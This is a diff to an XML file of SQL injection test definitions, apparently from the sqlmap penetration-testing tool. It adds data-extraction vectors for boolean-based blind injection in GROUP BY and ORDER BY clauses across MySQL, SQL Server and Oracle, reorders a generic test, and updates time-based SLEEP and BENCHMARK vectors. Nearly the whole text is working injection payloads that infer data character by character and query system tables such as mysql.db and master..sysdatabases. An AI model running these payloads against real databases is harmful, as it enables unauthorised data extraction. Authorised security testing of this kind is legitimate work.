@@ -402,7 +402,6 @@ Formats:
         <risk>1</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector></vector>
         <request>
             <payload>AND [RANDNUM]=[RANDNUM]</payload>
         </request>
@@ -418,7 +417,6 @@ Formats:
         <risk>3</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector></vector>
         <request>
             <payload>OR [RANDNUM]=[RANDNUM]</payload>
         </request>
@@ -430,6 +428,24 @@ Formats:
 
 
     <!-- Boolean-based blind tests - GROUP BY and ORDER BY clauses -->
+    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
+    <!-- NOTE: this does not behave as expected against SQLite -->
+    <test>
+        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>, (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/0 END))</vector>
+        <request>
+            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
+        </request>
+        <response>
+            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
+        </response>
+    </test>
+
     <test>
         <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
         <stype>1</stype>
@@ -437,7 +453,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>, (SELECT (CASE WHEN (ORD(MID((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</vector>
         <request>
             <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
@@ -457,7 +473,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>, (SELECT (CASE WHEN (ORD(MID((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
         <request>
             <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
@@ -476,7 +492,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>, (SELECT (CASE WHEN (ASCII(SUBSTRING((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
         <request>
             <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
@@ -495,7 +511,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>, (SELECT (CASE WHEN (ASCII(SUBSTR((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</vector>
         <request>
             <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
@@ -505,24 +521,6 @@ Formats:
         <details>
             <dbms>Oracle</dbms>
         </details>
-    </test>
-
-    <!-- TODO: check against Microsoft Access and SAP MaxDB -->
-    <!-- NOTE: this does not behave as expected against SQLite -->
-    <test>
-        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector></vector>
-        <request>
-            <payload>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
-        </request>
-        <response>
-            <comparison>, (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
-        </response>
     </test>
 
     <test>
@@ -552,7 +550,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
-        <vector></vector>
+        <vector>(SELECT (CASE WHEN (ORD(MID((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
@@ -571,7 +569,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>3</where>
-        <vector></vector>
+        <vector>(SELECT (CASE WHEN (ASCII(SUBSTRING((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
@@ -590,7 +588,7 @@ Formats:
         <risk>1</risk>
         <clause>3</clause>
         <where>3</where>
-        <vector></vector>
+        <vector>(SELECT (CASE WHEN (ASCII(SUBSTR((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
@@ -611,7 +609,7 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
-        <vector></vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/0 END))</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
         </request>
@@ -1216,7 +1214,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
+        <vector>AND IF(([INFERENCE]), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
         <request>
             <payload>AND SLEEP([SLEEPTIME])</payload>
         </request>
@@ -1236,7 +1234,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</vector>
+        <vector>AND IF(([INFERENCE]), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</vector>
         <request>
             <payload>AND BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1303,7 +1301,7 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR IF((%s), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
+        <vector>OR IF(([INFERENCE]), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
         <request>
             <payload>OR SLEEP([SLEEPTIME])</payload>
         </request>
@@ -1323,7 +1321,7 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR IF((%s), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</vector>
+        <vector>OR IF(([INFERENCE]), [RANDNUM], BENCHMARK(5000000, MD5('[SLEEPTIME]'))</vector>
         <request>
             <payload>OR BENCHMARK(5000000, MD5('[SLEEPTIME]'))</payload>
         </request>
